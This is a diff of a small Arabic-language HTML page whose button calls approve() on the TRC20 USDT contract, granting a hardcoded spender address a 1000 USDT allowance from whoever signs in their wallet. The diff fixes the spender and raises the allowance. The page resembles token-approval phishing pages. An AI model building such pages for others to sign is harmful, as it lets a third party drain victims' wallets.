@@ -1,39 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>Approve USDT (TRC20)</title>
+  <title>Approve USDT TRC20</title>
 </head>
 <body>
-  <h2>  (RC-20)</h2>
-  <button onclick="approveUSDT()">Approve USDT</button>
+  <h2>Approve USDT (TRC20)</h2>
+  <button onclick="approveUSDT()">اعطِ صلاحية spender</button>
 
   <script>
     const usdtContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
 
-    // العنوان اللي هتمنحه الصلاحية (spender)
-    let spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu"; // عدل العنوان حسب حاجتك
-
-    // الكمية (1 USDT = 1_000_000 لأن decimals = 6)
-    const approveAmount = "1000000";
+    // العنوان اللي بعتته كـ spender
+    const spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
 
     async function approveUSDT() {
       try {
-        // تحقق من وجود tronWeb
         if (!window.tronWeb) {
-          alert("يرجى تثبيت TronLink أو فتح الصفحة من داخل تطبيق المحفظة");
+          alert("يرجى فتح الصفحة داخل TronLink أو محفظة تدعم tronWeb.");
           return;
         }
 
         // تحقق من صحة العنوان
         if (!window.tronWeb.isAddress(spenderAddress)) {
-          alert("العنوان الممنوح للصلاحية (spender) غير صحيح!");
+          alert("العنوان الممنوح للصلاحية (spender) غير صالح!");
           return;
         }
 
-        // تحويل العنوان إلى Hex
+        // تحويل العنوان إلى صيغة Hex
         const spenderHex = window.tronWeb.address.toHex(spenderAddress);
 
+        // إعداد العقد
         const contract = await window.tronWeb.contract([
           {
             "constant": false,
@@ -47,16 +44,19 @@
           }
         ], usdtContractAddress);
 
-        const tx = await contract.approve(spenderHex, approveAmount).send({
+        // قيمة الابروف - 1000 USDT (1000 * 10^6 لأن decimals = 6)
+        const amount = "1000000000";
+
+        const tx = await contract.approve(spenderHex, amount).send({
           feeLimit: 100_000_000
         });
 
-        alert("تم إرسال المعاملة بنجاح ✅\nTransaction ID:\n" + tx);
+        alert("تم إرسال المعاملة بنجاح!\nTransaction ID:\n" + tx);
         console.log("Transaction ID:", tx);
 
       } catch (error) {
-        console.error("خطأ في المعاملة:", error);
-        alert("فشل تنفيذ عملية Approve:\n" + (error.message || error));
+        console.error("خطأ أثناء المعاملة:", error);
+        alert("فشل تنفيذ عملية approve:\n" + (error.message || error));
       }
     }
   </script>
